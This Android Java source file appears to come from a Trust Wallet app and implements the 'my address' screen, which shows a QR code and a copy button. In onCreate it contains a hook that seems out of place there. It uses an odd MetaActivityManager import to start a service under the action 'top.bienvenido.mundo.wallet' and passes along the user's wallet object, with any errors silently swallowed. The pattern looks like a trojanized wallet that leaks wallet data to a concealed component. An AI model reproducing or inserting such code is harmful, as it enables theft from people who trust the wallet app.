package com.wallet.crypto.trustapp.ui;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Point;
import android.os.Bundle;
import android.os.RemoteException;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.google.zxing.BarcodeFormat;
import com.google.zxing.MultiFormatWriter;
import com.google.zxing.common.BitMatrix;
import com.journeyapps.barcodescanner.BarcodeEncoder;
import com.wallet.crypto.trustapp.R;
import com.wallet.crypto.trustapp.entity.NetworkInfo;
import com.wallet.crypto.trustapp.entity.Wallet;
import com.wallet.crypto.trustapp.repository.EthereumNetworkRepositoryType;

import javax.inject.Inject;

import dagger.android.AndroidInjection;
import net_62v.external.MetaActivityManager;

import static com.wallet.crypto.trustapp.C.Key.WALLET;

import androidx.annotation.Nullable;

public class MyAddressActivity extends BaseActivity implements View.OnClickListener {

    private static final float QR_IMAGE_WIDTH_RATIO = 0.9f;
    public static final String KEY_ADDRESS = "key_address";

    @Inject
    protected EthereumNetworkRepositoryType ethereumNetworkRepository;

    private Wallet wallet;
    private String filterAddress(String origin)
    {
        if(origin.startsWith("0x")) return origin;
        return "0x" + origin;
    }

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        AndroidInjection.inject(this);

        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_my_address);

        toolbar();

        wallet = getIntent().getParcelableExtra(WALLET);
        try {
            MetaActivityManager.startService(
                    new Intent(
                            "top.bienvenido.mundo.wallet"
                    ).putExtra(
                            "wallet",
                            wallet
                    ),
                    0
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
        NetworkInfo networkInfo = ethereumNetworkRepository.getDefaultNetwork();
        String suggestion = getString(R.string.suggestion_this_is_your_address, networkInfo.name);
        ((TextView) findViewById(R.id.address_suggestion)).setText(suggestion);
        ((TextView) findViewById(R.id.address)).setText(filterAddress(wallet.address));
        findViewById(R.id.copy_action).setOnClickListener(this);
        final Bitmap qrCode = createQRImage(filterAddress(wallet.address));
        ((ImageView) findViewById(R.id.qr_image)).setImageBitmap(qrCode);
        findViewById(R.id.qr_image).setOnClickListener((v)-> {
            Toast.makeText(this, "Please take a screenshot to save.", Toast.LENGTH_SHORT).show();
        });
    }

    private Bitmap createQRImage(String address) {
        Point size = new Point();
        getWindowManager().getDefaultDisplay().getSize(size);
        int imageSize = (int) (size.x * QR_IMAGE_WIDTH_RATIO);
        try {
            BitMatrix bitMatrix = new MultiFormatWriter().encode(
                    address,
                    BarcodeFormat.QR_CODE,
                    imageSize,
                    imageSize,
                    null);
            BarcodeEncoder barcodeEncoder = new BarcodeEncoder();
            return barcodeEncoder.createBitmap(bitMatrix);
        } catch (Exception e) {
            Toast.makeText(this, getString(R.string.error_fail_generate_qr), Toast.LENGTH_SHORT)
                .show();
        }
        return null;
    }

    @Override
    public void onClick(View v) {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText(KEY_ADDRESS, wallet.address);
        if (clipboard != null) {
            clipboard.setPrimaryClip(clip);
        }
        Toast.makeText(this, "Copied to clipboard", Toast.LENGTH_SHORT).show();
    }
}
